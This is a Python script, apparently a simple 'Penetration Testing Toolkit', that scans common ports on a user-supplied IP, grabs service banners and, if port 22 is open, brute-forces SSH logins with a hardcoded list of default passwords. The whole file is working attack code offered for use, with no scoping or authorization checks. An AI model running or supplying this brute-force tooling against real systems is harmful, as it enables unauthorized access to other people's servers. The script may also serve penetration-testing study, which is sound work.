import socket
import paramiko

def scan_ports(target, ports):
    """Scan specified ports on the target and return a list of open ports."""
    open_ports = []
    print(f"\n[+] Scanning {target} for open ports...")
    for port in ports:
        print(f"[-] Checking port {port}...", end=" ")
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    print("Open ✅")
                    open_ports.append(port)
                else:
                    print("Closed ❌")
        except Exception as e:
            print(f"Error: {e}")
    return open_ports

def grab_banners(target, ports):
    """Grab banners from open ports on the target."""
    print(f"\n[+] Grabbing banners from {target}...")
    for port in ports:
        try:
            with socket.socket() as s:
                s.settimeout(2)
                s.connect((target, port))
                s.send(b'HEAD / HTTP/1.1\r\n\r\n')
                banner = s.recv(1024).decode(errors='ignore').strip()
                print(f"[+] Banner on port {port}: {banner[:100]}")
        except Exception as e:
            print(f"[!] Could not grab banner on port {port}: {e}")

def ssh_brute_force(host, port, username, password_list):
    """Perform SSH brute-force attack using a given username and password list."""
    print(f"\n[+] Starting SSH brute-force on {host}:{port} with username '{username}'")
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host, port=port, username=username, password=password, timeout=3)
            print(f"[✔] SUCCESS: Password found: '{password}'")
            ssh.close()
            return password
        except paramiko.AuthenticationException:
            print(f"[-] Failed login: {password}")
        except Exception as e:
            print(f"[!] SSH error: {e}")
            break
    print("[✘] Brute-force failed. No valid password found.")
    return None

def main():
    print("=== Penetration Testing Toolkit ===")
    target = input("Enter target IP address: ").strip()

    # Expanded list of common ports to increase the chance of detection
    ports_to_scan = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 8080, 8000, 8888, 5000]

    # Step 1: Port scanning with open/closed output
    open_ports = scan_ports(target, ports_to_scan)

    if not open_ports:
        print("\n[!] No open ports found. Exiting.")
        return

    # Step 2: Banner grabbing for open ports
    grab_banners(target, open_ports)

    # Step 3: SSH brute-force (only if port 22 is open)
    if 22 in open_ports:
        username = input("\nEnter SSH username to brute-force: ").strip()
        password_list = ["admin", "root", "123456", "toor", "password", "1234"]
        ssh_brute_force(target, 22, username, password_list)

if __name__ == "__main__":
    main()
